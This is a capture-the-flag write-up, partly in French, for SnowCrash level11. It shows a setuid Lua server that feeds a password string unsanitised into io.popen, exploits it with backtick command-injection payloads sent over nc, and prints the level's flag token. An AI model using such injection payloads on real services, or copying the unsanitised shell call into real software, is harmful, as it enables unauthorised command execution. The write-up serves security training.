# LEVEL1

ls -la : 

```
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```

```
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 = NotSoEasy


On peut voir que le programme fait appel à la fonction : io.open()

**io.popen()** starts the program in a separate process and returns a file handle that you can use to read data from this program.

Syntax
output = io.popen(command)

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `whoami` > /tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
flag11
```

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/token
Erf nope..
```

```
level11@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
